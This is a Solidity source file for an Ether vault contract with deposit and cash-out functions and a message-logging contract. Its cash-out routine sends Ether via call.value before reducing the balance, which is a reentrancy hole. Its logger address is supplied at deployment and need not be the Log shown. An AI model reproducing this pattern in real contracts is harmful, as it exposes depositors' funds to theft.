pragma solidity ^0.4.19;

contract ETH_VAULT
{
    mapping (address => uint) public balances;
    
    uint public MinDeposit = 1 ether;
    
    Log TransferLog;
    
    function ETH_VAULT(address _log)
    public 
    {
        TransferLog = Log(_log);
    }
    
    function Deposit()
    public
    payable
    {
        checkDeposit(msg.sender, msg.value);
    }
    
    function checkDeposit(address sender, uint value)
    internal
    {
        if(value > MinDeposit)
        {
            balances[sender] += value;
            TransferLog.AddMessage(sender, value, "Deposit");
        }
    }
    
    function CashOut(uint _am)
    public
    payable
    {
        checkCashOut(msg.sender, _am);
    }

    function checkCashOut(address sender, uint _am)
    internal
    {
        if(_am <= balances[sender])
        {
            if(sender.call.value(_am)())
            {
                balances[sender] -= _am;
                TransferLog.AddMessage(sender, _am, "CashOut");
            }
        }
    }
    
    function() public payable{}    
    
}

contract Log 
{
   
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    
    Message[] public History;
    
    Message LastMsg;
    
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        updateMessage(_adr, _val, _data);
    }
    
    function updateMessage(address _adr, uint _val, string _data)
    internal
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}